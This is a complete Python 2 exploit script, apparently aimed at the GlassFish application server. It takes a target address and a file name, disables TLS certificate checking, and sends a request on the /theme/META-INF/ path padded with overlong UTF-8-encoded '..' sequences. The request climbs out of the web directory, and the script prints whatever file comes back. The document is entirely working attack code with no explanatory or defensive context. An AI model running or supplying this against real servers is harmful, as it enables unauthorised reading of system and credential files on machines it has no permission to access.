#!/usr/bin/python
# Usage: python glassfish.py 1.1.1.1 FileNameOrDirectory
import urllib2
import sys   
import ssl

ipport=str(sys.argv[1])
fname=str(sys.argv[2])

if hasattr(ssl, '_create_unverified_context'):
	ssl._create_default_https_context = ssl._create_unverified_context

response=urllib2.urlopen('https://' + ipport + '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/'+fname)
s=response.read()
print s
